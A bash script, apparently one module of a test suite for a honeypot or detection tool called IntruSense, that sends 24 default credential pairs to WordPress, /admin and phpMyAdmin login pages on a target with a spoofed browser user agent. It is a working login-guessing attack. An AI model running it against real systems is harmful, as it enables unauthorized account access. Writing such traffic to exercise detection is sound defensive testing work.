#!/usr/bin/env bash
# Module 06: Credential Stuffing (Web Login)
# POSTs username:password combos to all login endpoints — fills the credentials table

TARGET_IP="${TARGET_IP:-$1}"
PORT="${TARGET_PORT:-8080}"
[[ -z "$TARGET_IP" ]] && { echo "TARGET_IP not set"; exit 1; }

BASE="http://$TARGET_IP:$PORT"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 24 realistic credential pairs
declare -a CREDS=(
  "admin:admin"
  "admin:password"
  "admin:admin123"
  "admin:password123"
  "admin:123456"
  "root:root"
  "root:toor"
  "root:password"
  "administrator:admin"
  "administrator:password"
  "user:user"
  "user:password"
  "test:test"
  "test:password"
  "guest:guest"
  "john.smith:Password1"
  "j.smith:Welcome1"
  "jsmith:Summer2024"
  "admin@company.com:admin"
  "support:support123"
  "backup:backup2024"
  "service:service"
  "webmaster:webmaster"
  "info:info123"
)

echo "[06] Starting credential stuffing against $BASE"
echo "[06] ${#CREDS[@]} credential pairs to attempt"

i=0
for cred in "${CREDS[@]}"; do
  i=$(( i + 1 ))
  user="${cred%%:*}"
  pass="${cred##*:}"
  echo "[06] [$i/${#CREDS[@]}] Trying: $user / $pass"

  # WordPress-style login
  curl -s -o /dev/null --connect-timeout 3 -A "$UA" \
    -X POST -d "log=${user}&pwd=${pass}&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
    "$BASE/wp-login.php" 2>/dev/null || true

  # Generic admin login
  curl -s -o /dev/null --connect-timeout 3 -A "$UA" \
    -X POST -d "username=${user}&password=${pass}&submit=Login" \
    "$BASE/admin" 2>/dev/null || true

  # phpMyAdmin login
  curl -s -o /dev/null --connect-timeout 3 -A "$UA" \
    -X POST -d "pma_username=${user}&pma_password=${pass}&server=1" \
    "$BASE/phpmyadmin" 2>/dev/null || true

  sleep 0.35
done

echo "[06] Credential stuffing complete — $i pairs × 3 endpoints = $(( i * 3 )) total requests"
echo "[06] Check attacker profile in IntruSense — credentials table should be populated"
